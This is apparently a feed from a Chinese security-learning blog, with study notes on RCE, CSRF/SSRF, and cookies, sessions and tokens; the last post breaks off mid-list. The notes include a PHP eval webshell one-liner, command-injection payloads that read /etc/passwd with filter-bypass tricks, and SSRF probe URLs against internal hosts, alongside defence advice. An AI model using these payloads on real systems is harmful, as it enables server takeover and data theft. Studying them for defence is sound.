    <content type="html"><![CDATA[<h1 id="rce概述"><a class="markdownIt-Anchor" href="#rce概述"></a> RCE概述</h1><p>RCE漏洞，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统。分为两类：</p><ul><li><p><strong>代码执行</strong></p><p><strong>因为需求设计，后台有时候也会把用户的输入作为代码的一部分进行执行，也就造成了远程代码执行漏洞</strong></p></li><li><p><strong>命令执行</strong></p><p><strong>一般出现这种漏洞，是因为应用系统从设计上需要给用户提供指定的远程命令操作的接口。比如我们常见的路由器、防火墙、入侵检测等设备的web管理界面上</strong>。一般会给用户提供一个ping操作的web界面，用户从web界面输入目标IP，提交后，后台会对该IP地址进行一次ping测试，并返回测试结果。如果，设计者在完成该功能时，没有做严格的安全控制，则可能会导致攻击者通过该接口提交“意想不到”的命令，从而让后台进行执行，从而控制整个后台服务器。</p></li></ul><p>注意的是，如果想要挖掘这样的漏洞，如果这个网站本身不需要这些功能，那么基本上就没有这些漏洞出现。所以此漏洞可利用的条件：</p><ol><li>有该拓展环境</li><li>漏洞函数</li><li>可控变量</li></ol><p><img src="/images/RCE%E5%9F%BA%E7%A1%80-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C&amp;%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/RCE-16856878790805.png" alt="RCE" /></p><h2 id="rce函数相关"><a class="markdownIt-Anchor" href="#rce函数相关"></a> RCE函数相关</h2><h3 id="php"><a class="markdownIt-Anchor" href="#php"></a> PHP</h3><h4 id="代码执行"><a class="markdownIt-Anchor" href="#代码执行"></a> 代码执行</h4><blockquote><p>eval()、assert()、preg_replace()、create_function()、array_map()、call_user_func()、call_user_func_array()、array_filter()、uasort()</p></blockquote><p><code>eval() </code>函数把字符串按照 PHP 代码来计算。该字符串必须是合法的 PHP 代码，且必须以分号结尾。</p><h4 id="命令执行"><a class="markdownIt-Anchor" href="#命令执行"></a> 命令执行</h4><blockquote><p>system()、exec()、shell_exec()、pcntl_exec()、popen()、proc_popen()、passthru()、反引号与<code>$()</code></p></blockquote><ol><li>有回显（执行并回显）</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php system(&#x27;ls&#x27;);?&gt;</span><br><span class="line">&lt;?php passthru(&#x27;ls&#x27;);?&gt;</span><br></pre></td></tr></table></figure><ol start="2"><li>无回显（执行但不回显）</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">echo &quot;&lt;pre&gt;&quot;;</span><br><span class="line">echo exec(&#x27;ls&#x27;);</span><br><span class="line">echo &quot;&lt;/pre&gt;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">echo &quot;&lt;pre&gt;&quot;;</span><br><span class="line">echo shell_exec(&#x27;ls&#x27;);</span><br><span class="line">echo &quot;&lt;/pre&gt;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h3 id="java命令执行"><a class="markdownIt-Anchor" href="#java命令执行"></a> JAVA（命令执行）</h3><p>在Java 开发语言中可以执行系统命令的函数有：</p><ol><li>Runtime.getRuntime.exec</li><li>ProcessBuilder.start</li></ol><p>其中，Runtime.getRuntime.exec 是在Java1.5 之前提供的，Java1.5 之后则提供了ProcessBuilder 类来构建进程</p><h4 id="processbuilder"><a class="markdownIt-Anchor" href="#processbuilder"></a> ProcessBuilder</h4><p>Java.lang.ProcessBuilder 类用于创建操作系统进程，每个ProcessBuilder 实例管理一个进程属性集。start() 方法利用这些属性创建一个新的Process 实例， 可以利用ProcessBuilder 执行命令。</p><p>ProcessBuilder 执行命令的方式如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ProcessBuilder</span> <span class="variable">pb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(<span class="string">&quot;myCommand&quot;</span>, <span class="string">&quot;myArg&quot;</span>); <span class="comment">//ProcessBuilder p = new ProcessBuilder(&quot;ls&quot;,&quot;-al&quot;);</span></span><br><span class="line"><span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> pb.start();</span><br></pre></td></tr></table></figure><h4 id="runtimegetruntime"><a class="markdownIt-Anchor" href="#runtimegetruntime"></a> Runtime.getRuntime</h4><p><code>java.lang.Runtime </code>公共类中的<code>exec()</code>方法同样也可以执行系统命令，<code>exec()</code>方法的使用方式有以下6 种：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//在单独的进程中执行指定的字符串命令</span></span><br><span class="line"><span class="keyword">public</span> Process <span class="title function_">exec</span><span class="params">(String command)</span></span><br><span class="line"><span class="comment">//在单独的进程中执行指定的命令和参数</span></span><br><span class="line"><span class="keyword">public</span> Process <span class="title function_">exec</span><span class="params">(String[] cmdarray)</span></span><br><span class="line"><span class="comment">//在具有指定环境的单独进程中执行指定的命令和参数</span></span><br><span class="line"><span class="keyword">public</span> Process <span class="title function_">exec</span><span class="params">(String[] cmdarray, String[] envp)</span></span><br><span class="line"><span class="comment">//在具有指定环境和工作目录的单独进程中执行指定的命令和参数</span></span><br><span class="line"><span class="keyword">public</span> Process <span class="title function_">exec</span><span class="params">(String[] cmdarray, String[] envp, File dir)</span></span><br><span class="line"><span class="comment">//在具有指定环境的单独进程中执行指定的字符串命令</span></span><br><span class="line"><span class="keyword">public</span> Process <span class="title function_">exec</span><span class="params">(String command, String[] envp)</span></span><br><span class="line"><span class="comment">//在具有指定环境和工作目录的单独进程中执行指定的字符串命令</span></span><br><span class="line"><span class="keyword">public</span> Process <span class="title function_">exec</span><span class="params">(String command, String[] envp, File dir)</span></span><br></pre></td></tr></table></figure><p>正常执行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Process proc = Runtime.getRuntime().exec(&quot;ping 127.0.0.1&quot;);</span><br></pre></td></tr></table></figure><p>与ProcessBuilder不同的是，如果他要执行多条命令，则需要输入数组，而非简单拼接：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Process</span> <span class="variable">proc</span> <span class="operator">=</span> Runtime.getRuntime().exec(<span class="string">&quot;ping 127.0.0.1;ls&quot;</span>);<span class="comment">//运行错误</span></span><br><span class="line">String[] command = &#123;<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;ping -t 3 127.0.0.1;id&quot;</span>&#125;;</span><br><span class="line"><span class="type">Process</span> <span class="variable">pro</span> <span class="operator">=</span> Runtime.getRuntime().exec(command);<span class="comment">//执行成功，他是直接调用了ProcessBuilder执行</span></span><br></pre></td></tr></table></figure><p>所以产生拼接的命令执行漏洞就得按上面的写法，不然还不能拼接~</p><p>除此之外，使用这个函数还有很多<strong>需要注意的点</strong>：</p><ol><li><p>字符串执行需要替换空格（<code>$&#123;IFS&#125;</code>、<code>$IFS$9</code>）：</p><p>如果exec 方法执行的参数是字符串参数，参数中的空格会经过StringTokenizer 处理，处理完成后会改变原有的语义导致命令无法正常执行。例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cmd=sh -c ls;cat /etc/passwd //执行失败</span><br><span class="line">cmd=sh -c ls;id //执行成功</span><br><span class="line"></span><br><span class="line">cmd=sh -c ls;cat$&#123;IFS&#125;/etc/passwd //执行失败，因为我们的请求中包含无效的字符&#123;&#125;，它不属于保留字符，所以出错！</span><br><span class="line">cmd=sh%20-c%20ls;cat$%7BIFS%7D/etc/passwd //编码后执行成功，当然也可以使用$IFS$9</span><br></pre></td></tr></table></figure></li></ol><h1 id="挖掘与防范"><a class="markdownIt-Anchor" href="#挖掘与防范"></a> 挖掘与防范</h1><h2 id="挖掘"><a class="markdownIt-Anchor" href="#挖掘"></a> 挖掘</h2><p>黑盒测试：网站中有特殊功能，比如Ping、数据库备份等等。</p><p>白盒测试：查看命令执行函数是否做过滤。命令执行函数上述有提到</p><p>后面将会讲到其他漏洞的复现</p><h2 id="防范"><a class="markdownIt-Anchor" href="#防范"></a> 防范</h2><ul><li>敏感函数禁用，尽量不要使用命令执行函数，不能完全控制的危险函数最好不使用。</li><li>在进入执行命令函数前进行严格的检测和过滤；</li><li>部署WAF</li><li>多使用安全API，而不直接利用命令执行函数</li></ul><h1 id="利用与绕过"><a class="markdownIt-Anchor" href="#利用与绕过"></a> 利用与绕过</h1><h2 id="代码注入"><a class="markdownIt-Anchor" href="#代码注入"></a> 代码注入</h2><p>利用：利用后端脚本的特殊性对服务器进行攻击。</p><p>PHP：</p><ul><li>phpinfo<strong>可以获取到很多信息。例如收集</strong>绝对路径**，<strong>真实ip</strong>，<strong>绕过xss的httponly($_SERVER[“HTTP_COOKIE”])</strong>，存在oci8推测数据库可能为oracle。</li><li>eval写一句话木马getshell之类的。</li></ul><p>其绕过方式一般都是替换关键字、关键字大小写、编码等等过滤了PHP代码，可以使用<code>=</code>绕过：<code>&lt;?=eval($_REQUEST['cmd']);?&gt;</code></p><p><strong>【更加详细内容可以去看：WAF绕过-一般性绕过总结】</strong></p><h2 id="命令注入"><a class="markdownIt-Anchor" href="#命令注入"></a> 命令注入</h2><p>利用该漏洞实际上就是通过管道符、拼接符等方式进行命令注入而达到攻击的目的。</p><p>这里写绕过姿势：</p><p>黑名单绕过：</p><ul><li><p>关键字绕过</p><ul><li><p>双引号：<code>l''s</code></p></li><li><p>反斜杠：<code>l\s</code></p></li><li><p>倒过来写：<code>tac</code> == <code>cat</code></p></li><li><p>替换：</p><p>cat可以由以下来代替</p><blockquote><p>(1)<code>more</code>:一页一页的显示的显示档案内容<br />(2)<code>less</code>:与<code>more</code>类似,但是比<code>more</code>更好的是,他可以[pg dn][pg up]翻页<br />(3)<code>head</code>:查看头几行<br />(4)<code>tac</code>:从最后一行开始显示,可以看出<code>tac</code>是<code>cat</code>的反向显示<br />(5)<code>tail</code>:查看尾几行<br />(6)<code>nl</code>:显示的时候,顺便输出行号<br />(7)<code>od</code>:以二进制的方式读取档案内容<br />(8)<code>vi</code>:一种编辑器，这个也可以查看<br />(9)<code>vim</code>:一种编辑器,这个也可以查看<br />(10)<code>sort</code>:可以查看<br />(11)<code>uniq</code>:可以查看<br />(12)<code>file -f</code>:报错出具体的内容<br /><strong>(13)<code>base64</code>:输出然后自己解码就好</strong></p></blockquote></li></ul></li><li><p>空格绕过</p><ul><li><code>&lt;&gt;</code>重定向：<code>cat&lt;flag_123</code></li><li><code>$IFS$9, $&#123;IFS&#125;</code>空字符</li><li>逗号与{}：<code>&#123;cat,flag_123&#125;</code></li></ul></li><li><p>管道符<code>&amp;</code>，<code>;</code>，<code>|</code>等被过滤（注意，windows不支持<code>;</code>）</p><ul><li>linux:<br /><code>%0a</code> 回车<br /><code>%0d </code>换行</li><li>windows:<br /><code>%0a</code> 回车<br /><code>%1a </code>作为.bat文件的命令分隔符</li></ul></li></ul><h1 id="其他"><a class="markdownIt-Anchor" href="#其他"></a> 其他</h1><h2 id="管道符的含义"><a class="markdownIt-Anchor" href="#管道符的含义"></a> 管道符的含义</h2><p><strong>Window系列支持的管道符如下所示。</strong></p><ul><li>&quot; | &quot;:直接执行后面的语句。例如：ping 127.0.0.1 | whoami。</li><li>“ || ”：如果前面执行的语句执行出错，则执行后面的语句，前面的语句只能为假。例如：<code>ping 127.0.0.1 || whoami</code></li><li>&quot; &amp; &quot; :如果前面的语句为假则直接执行后面的语句,前面的语句可真可假。例如：<code> ping 127.0.0.1 &amp;whoami</code>。</li><li>“ &amp;&amp; ”： 如果前面的语句为假则直接出错，也不执行后面的语句，前面的语句只能为真。例如：<code>ping 127.0.0.1 &amp;&amp; whoami</code>。</li></ul><p><strong>Linux 系统支持的管道符如下所示：</strong></p><ul><li>“；”执行完前面的语句再执行后面的。例如: <code>ping 127.0.0.1;whoami</code></li><li>“ | ”：显示后面语句的执行结果。例如: <code>ping 127.0.0.1 | whoami</code>。</li><li>“ || ”： 当前面的语句执行出错时，执行后面的语句。例如： <code>ping 1|| whoami</code>。</li><li>“ &amp; ”： 如果前面的语句执行为假则直接执行后面的语句。前面的语句可真可假。例如：<code>ping 127.0.0.1 &amp; whoami</code>。</li><li>“ &amp;&amp; ”：如果前面的语句为假则直接出错，也不执行后面的，前面的语句只能为真。例如： <code>ping 127.0.0.1 &amp;&amp; whoami</code>。</li></ul><h2 id="poc与exp"><a class="markdownIt-Anchor" href="#poc与exp"></a> POC与EXP</h2><p>POC是验证</p><p>EXP是利用</p><h2 id="tips"><a class="markdownIt-Anchor" href="#tips"></a> TIPS</h2><p>一般使用base64输出文件内容，因为有的字符没办法在屏幕上看见</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;rce概述&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#rce概述&quot;&gt;&lt;/a&gt; RCE概述&lt;/h1&gt;
&lt;p&gt;RCE漏洞，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统。分为两类：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;</summary>
      
    
    
    
    <category term="渗透测试基础" scheme="https://j3f5.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/"/>
    
    
    <category term="RCE" scheme="https://j3f5.github.io/tags/RCE/"/>
    
  </entry>
  
  <entry>
    <title>CSRF与SSRF漏洞基础</title>
    <link href="https://j3f5.github.io/articles/2023/06/01/CSRF%E4%B8%8ESSRF%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/"/>
    <id>https://j3f5.github.io/articles/2023/06/01/CSRF%E4%B8%8ESSRF%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/</id>
    <published>2023-06-01T06:59:49.000Z</published>
    <updated>2023-06-01T06:59:49.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="csrf"><a class="markdownIt-Anchor" href="#csrf"></a> CSRF</h1><h2 id="概念以及原理"><a class="markdownIt-Anchor" href="#概念以及原理"></a> 概念以及原理</h2><p>Cross Site Request Forgery，跨站请求伪造，由客户端发起，是一种劫持受信任用户向服务器发送非预期请求的攻击方式，与XSS相似，但比XSS更难防范，常与XSS一起配合攻击。</p><p>顾名思义，也就是<strong>在a.com可以执行（发送）b.com的请求，例如请求b.com删除某个数据</strong>。</p><p>详细：</p><ol><li><p>攻击者盗用了你的身份信息，以你的名义发送恶意请求，对服务器来说这个请求是你发起的，却完成了攻击者所期望的一个操作</p></li><li><p>XSS 利用站点内内的信任用户，盗取cookie，CSRF通过伪装成受信任用户请求受信任的网站，利用目标用户的合法身份，以目标的名义执行某些非法参数</p></li><li><p>利用条件：</p><ol><li>已经登录系统</li><li>用户访问URL</li><li>已存在的网站中让用户跳转</li></ol></li></ol><p><img src="/images/CSRF%E4%B8%8ESSRF%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/2265061-20210123102622326-838621900.png" alt="img" /></p><p><img src="/images/CSRF%E4%B8%8ESSRF%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/2265061-20210123102631138-1077454166.png" alt="img" /></p><h2 id="防御"><a class="markdownIt-Anchor" href="#防御"></a> 防御</h2><ol><li>当用户发送重要的请求时输入<strong>验证码</strong></li><li>设置<strong>随机TOKEN</strong> <em>—数据包的唯一值</em></li><li><strong>检测referer来源</strong>，请求时判断请求连接是否为当前管理员正在使用的页面（管理员在编辑文章，黑客发来恶意的修改密码链接，因为修改密码页面管理员并没有在操作，所以攻击失败）</li><li><strong>限制请求方式只能为post</strong>。因为URL跳转一般都是GET，如果限制只能为POST，那么跳转不了，因为带不了数据包块</li></ol><h1 id="ssrf"><a class="markdownIt-Anchor" href="#ssrf"></a> SSRF</h1><h2 id="概念-原理与相关注意点"><a class="markdownIt-Anchor" href="#概念-原理与相关注意点"></a> 概念、原理与相关注意点</h2><p>Server-Side Request Forgery，服务器端请求伪造)，是一种由攻击者构造形成<strong>由服务端</strong>发起请求的一个安全漏洞。</p><p><strong>攻击目标</strong>：<strong>SSRF攻击的目标是从外网无法访问的内部系统</strong>。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）</p><p><strong>形成原因</strong>：<strong>由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制</strong>。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。</p><blockquote><p>除了http/https等方式可以造成ssrf，类似tcp connect 方式也可以探测内网一些ip 的端口是否开发服务，只不过危害比较小而已。</p></blockquote><img src="/images/CSRF%E4%B8%8ESSRF%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/SSRF-16856769157974.png" alt="SSRF" style="zoom:67%;" /><h2 id="可能出现的地方"><a class="markdownIt-Anchor" href="#可能出现的地方"></a> 可能出现的地方</h2><p>可能出现的地方</p><ol><li>社交分享功能：获取超链接的标题等内容进行显示</li><li>转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览</li><li>在线翻译：给网址翻译对应网页的内容</li><li>图片加载/下载：例如富文本编辑器中的点击下载图片到本地；通过URL地址加载或下载图片</li><li>图片/文章收藏功能：主要其会取URL地址中title以及文本的内容作为显示以求一个好的用具体验</li><li>云服务厂商：它会远程执行一些命令来判断网站是否存活等，所以如果可以捕获相应的信息，就可以进行ssrf测试</li><li>网站采集，网站抓取的地方：一些网站会针对你输入的url进行一些信息采集工作</li><li>数据库内置功能：数据库的比如mongodb的copyDatabase函数</li><li>邮件系统：比如接收邮件服务器地址</li><li>编码处理, 属性信息处理，文件处理：比如ffpmg，ImageMagick，docx，pdf，xml处理器等</li><li>未公开的api实现以及其他扩展调用URL的功能：可以利用google 语法加上这些关键字去寻找SSRF漏洞</li><li>一些的url中的关键字：share、wap、url、link、src、source、target、u、3g、display、sourceURl、imageURL、domain……</li><li>从远程服务器请求资源（upload from url 如discuz！；import &amp; expost rss feed 如web blog；使用了xml引擎对象的地方 如wordpress xmlrpc.php）</li></ol><h2 id="漏洞检测"><a class="markdownIt-Anchor" href="#漏洞检测"></a> 漏洞检测</h2><p>一般发起网络请求中会使用libcurl库，所以他会有各种协议（可以简单执行<code>curl -V</code>）各个协议调用探针：http,file,dict,ftp,gopher 等</p><p>漏洞攻击：端口扫描，指纹识别，漏洞利用，内网探针等</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.64.144/phpmyadmin/</span><br><span class="line">file:///D:/www.txt</span><br><span class="line">dict://192.168.64.144:3306/info</span><br><span class="line">ftp://192.168.64.144:21</span><br></pre></td></tr></table></figure><h3 id="代码层面"><a class="markdownIt-Anchor" href="#代码层面"></a> 代码层面</h3><h4 id="php"><a class="markdownIt-Anchor" href="#php"></a> PHP</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">file_get_contents()</span><br><span class="line">fsockopen()</span><br><span class="line">curl_exec()</span><br></pre></td></tr></table></figure><p>以上三个函数使用不当会造成SSRF漏洞</p><p>需要注意以下几点：</p><ul><li>大部分 PHP 并不会开启 <code>fopen </code>的 gopher  wrapper</li><li>file_get_contents 的 gopher 协议不能 URLencode</li><li>file_get_contents 关于 Gopher 的 302 跳转有 bug，导致利用失败</li><li>curl/libcurl 7.43 上 gopher 协议存在 bug（%00 截断），经测试 7.49 可用</li><li>curl_exec() //默认不跟踪跳转</li><li>file_get_contents()  // file_get_contents支持php://input协议</li></ul><h4 id="java"><a class="markdownIt-Anchor" href="#java"></a> JAVA</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Request类，URL类的openStream，HttpClient类，URLConnection和HttpURLConnection类</span><br></pre></td></tr></table></figure><p>以上几种类引用不当会造成SSRF</p><p>网络请求支持的协议如下</p><p><code>http，https，file，ftp，mailto，jar，netdoc</code></p><p>对比php的ssrf，java这块利用相对局限</p><h2 id="绕过"><a class="markdownIt-Anchor" href="#绕过"></a> 绕过</h2><ol><li>数字IP（十进制IP等等）</li><li><code>?@#</code>特殊符号绕过：<code>www.baidu.com?www.me.com</code></li><li>子域名绕过</li><li>跳转IP（中转IP）</li><li>DNS重绑定（例如短地址）</li></ol><h2 id="利用"><a class="markdownIt-Anchor" href="#利用"></a> 利用</h2><ol><li>攻击内网进行扫描，识别服务器指纹并攻击</li><li>对主机进行端口扫描</li><li>运行主机内程序</li><li>读取内网信息（file协议）</li></ol><p>需要注意的是，<strong>回显是能否成功利用的重要的条件</strong>，在某些场景协议限定为HTTP模式且没有回显，利用<br />会相对复杂了。</p><h3 id="协议利用"><a class="markdownIt-Anchor" href="#协议利用"></a> 协议利用</h3><ul><li>DICT：除了泄露安装软件版本信息，还可以查看端口，**操作内网redis服务（只能一条指令一条指令地发送）**等</li><li>File：读取文件</li><li>Gopher：万能协议（利用Gopher攻击Redis、攻击Fastcgi 等</li><li>FTP(S)/SMB(S)：匿名访问及爆破</li><li>Tftp：UDP协议 发送UDP数据包</li><li>Telnet：SSH/Telnet匿名访问及爆破</li></ul><h3 id="漏洞利用小技巧"><a class="markdownIt-Anchor" href="#漏洞利用小技巧"></a> 漏洞利用小技巧</h3><p>crontab -l 显示当前计划任务</p><p>crontab -r 清除当前计划任务</p><p>端口转发工具 socat</p><p>在Apache配置文件中写入下面的内容，就可以将jpg文件当做PHP文件来执行 AddType application/x-httpd-php</p><h2 id="防御-2"><a class="markdownIt-Anchor" href="#防御-2"></a> 防御</h2><ol><li>统一错误信息</li><li><strong>协议限制：http &amp;&amp; https</strong></li><li>内网IP限制</li><li>域名限制<ol><li>需要一直解析到IP为止</li><li><strong>URL白名单</strong></li></ol></li><li>正则匹配</li><li><strong>禁止30x跳转</strong></li></ol><h2 id="绕过-2"><a class="markdownIt-Anchor" href="#绕过-2"></a> 绕过</h2><ol><li>数字IP（十进制IP等等）</li><li><code>?@#</code>特殊符号绕过：<code>www.baidu.com?www.me.com</code>、<code>www.a.com@10.10.10.1</code></li><li>子域名绕过</li><li>跳转IP（中转IP）</li><li>DNS重绑定（例如短地址）</li><li>指向任意IP的域名：<a href="http://xip.io">xip.io</a></li></ol><h2 id="常见ssrf漏洞"><a class="markdownIt-Anchor" href="#常见ssrf漏洞"></a> 常见SSRF漏洞</h2><ol><li><p>Wordpress3.5.1以下版本 xmlrpc.php pingback的缺陷与ssrf</p></li><li><p>discuz! 的ssrf （利用php的header函数来绕过，其实就是302跳转实现协议转换）</p></li><li><p>weblogic的ssrf</p></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;csrf&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#csrf&quot;&gt;&lt;/a&gt; CSRF&lt;/h1&gt;
&lt;h2 id=&quot;概念以及原理&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#概念以及原理&quot;&gt;&lt;/a&gt; 概念以及</summary>
      
    
    
    
    <category term="渗透测试基础" scheme="https://j3f5.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/"/>
    
    
    <category term="CSRF" scheme="https://j3f5.github.io/tags/CSRF/"/>
    
    <category term="SSRF" scheme="https://j3f5.github.io/tags/SSRF/"/>
    
  </entry>
  
  <entry>
    <title>授权与跨域共享</title>
    <link href="https://j3f5.github.io/articles/2023/05/31/%E6%8E%88%E6%9D%83%E4%B8%8E%E8%B7%A8%E5%9F%9F%E5%85%B1%E4%BA%AB/"/>
    <id>https://j3f5.github.io/articles/2023/05/31/%E6%8E%88%E6%9D%83%E4%B8%8E%E8%B7%A8%E5%9F%9F%E5%85%B1%E4%BA%AB/</id>
    <published>2023-05-31T02:02:30.000Z</published>
    <updated>2023-05-31T02:02:30.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="认证-授权与凭证的概念"><a class="markdownIt-Anchor" href="#认证-授权与凭证的概念"></a> 认证、授权与凭证的概念</h1><p><strong>认证</strong>：<strong>验证当前用户的身份</strong>。例如有一个登陆窗口，只有输入正确的账号密码就算认证成功。</p><p><strong>授权</strong>：<strong>用户授予第三方应用访问该用户某些资源的权限</strong>。例如有一个模特，经过一些协定，这模特把自己的肖像权授予商家使用。</p><p><strong>凭证</strong>：<strong>实现认证和授权的前提</strong>是需要一种<strong>媒介（证书）</strong>。例如认证中的账号密码，例如授权中的协定。</p><img src="/images/%E6%8E%88%E6%9D%83%E4%B8%8E%E8%B7%A8%E5%9F%9F%E5%85%B1%E4%BA%AB/image-20230531110524628.png" alt="image-20230531110524628" style="zoom:67%;" /><img src="/images/%E6%8E%88%E6%9D%83%E4%B8%8E%E8%B7%A8%E5%9F%9F%E5%85%B1%E4%BA%AB/image-20230531124840390.png" alt="image-20230531124840390" style="zoom:80%;" /><h2 id="cookie"><a class="markdownIt-Anchor" href="#cookie"></a> COOKIE</h2><p><strong>HTTP 是无状态的协议（对于事务处理没有记忆能力，每次客户端和服务端会话完成时，服务端不会保存任何会话信息</strong>）。服务器与浏览器为了进行会话跟踪（知道是谁在访问我），就必须主动的去维护一个状态，这个状态用于告知服务端前后两个请求是否来自同一浏览器。而这个状态需要通过 cookie 或者 session 去实现。</p><p><strong>cookie 存储在客户端：</strong> cookie 是服务器发送到用户浏览器并保存在本地的一小块数据，它会在浏览器下次向同一服务器再发起请求时被携带并发送到服务器上。</p><p><strong>cookie 是不可跨域的：</strong> 每个 cookie 都会绑定单一的域名，无法在别的域名下获取使用，<strong>一级域名和二级域名之间是允许共享使用的</strong>（<strong>靠的是 domain）</strong>。</p><p>重要属性：</p><table><thead><tr><th><strong>httpOnly</strong></th><th><strong>如果给某个 cookie 设置了 httpOnly 属性，则无法通过 JS 脚本 读取到该 cookie 的信息，但还是能通过 Application 中手动修改 cookie，所以只是在一定程度上可以防止 XSS 攻击，不是绝对的安全</strong></th></tr></thead></table><h2 id="session"><a class="markdownIt-Anchor" href="#session"></a> SESSION</h2><ul><li><strong>session 是另一种记录服务器和客户端会话状态的机制</strong></li><li><strong>session 是基于 cookie 实现的，session 存储在服务器端，sessionId 会被存储到客户端的cookie 中</strong></li></ul><img src="/images/%E6%8E%88%E6%9D%83%E4%B8%8E%E8%B7%A8%E5%9F%9F%E5%85%B1%E4%BA%AB/16f523a04d0b3cf5tplv-t2oaga2asx-zoom-in-crop-mark3024000.awebp" alt="session.png" style="zoom:67%;" /><ul><li>session 认证流程：<ul><li>用户第一次请求服务器的时候，服务器根据用户提交的相关信息，创建对应的 Session</li><li>请求返回时将此 Session 的唯一标识信息 SessionID 返回给浏览器</li><li>浏览器接收到服务器返回的 SessionID 信息后，会将此信息存入到 Cookie 中，同时 Cookie 记录此 SessionID 属于哪个域名</li><li>当用户第二次访问服务器的时候，请求会自动判断此域名下是否存在 Cookie 信息，如果存在自动将 Cookie 信息也发送给服务端，服务端会从 Cookie 中获取 SessionID，再根据 SessionID 查找对应的 Session 信息，如果没有找到说明用户没有登录或者登录失效，如果找到 Session 证明用户已经登录可执行后面操作。</li></ul></li></ul><p>根据以上流程可知，<strong>SessionID 是连接 Cookie 和 Session 的一道桥梁</strong>，大部分系统也是根据此原理来验证用户登录状态。<strong>由于关闭浏览器不会导致 session 被删除，迫使服务器为 session 设置了一个失效时间，当距离客户端上一次使用 session 的时间超过这个失效时间时，服务器就认为客户端已经停止了活动，才会把 session 删除以节省存储空间。</strong></p><h2 id="token"><a class="markdownIt-Anchor" href="#token"></a> TOKEN</h2><ul><li><strong>访问资源接口（API）时所需要的资源凭证</strong></li><li><strong>简单 token 的组成：</strong> uid(用户唯一的身份标识)、time(当前时间的时间戳)、sign（签名，token 的前几位以哈希算法压缩成的一定长度的十六进制字符串）</li><li>特点：<ul><li><strong>服务端无状态化、可扩展性好</strong></li><li><strong>支持移动端设备</strong></li><li>安全</li><li>支持跨程序调用</li></ul></li><li><strong>token 的身份验证流程：</strong></li></ul><img src="/images/%E6%8E%88%E6%9D%83%E4%B8%8E%E8%B7%A8%E5%9F%9F%E5%85%B1%E4%BA%AB/16f523a04d9c745ftplv-t2oaga2asx-zoom-in-crop-mark3024000.awebp" alt="img" style="zoom:80%;" /><ol><li>客户端使用用户名跟密码请求登录</li><li>服务端收到请求，去验证用户名与密码</li><li>验证成功后，服务端会签发一个 token 并把这个 token 发送给客户端</li><li>客户端收到 token 以后，会把它存储起来，比如放在 cookie 里或者 localStorage 里</li><li>客户端每次向服务端请求资源的时候需要带着服务端签发的 token</li><li>服务端收到请求，然后去验证客户端请求里面带着的 token 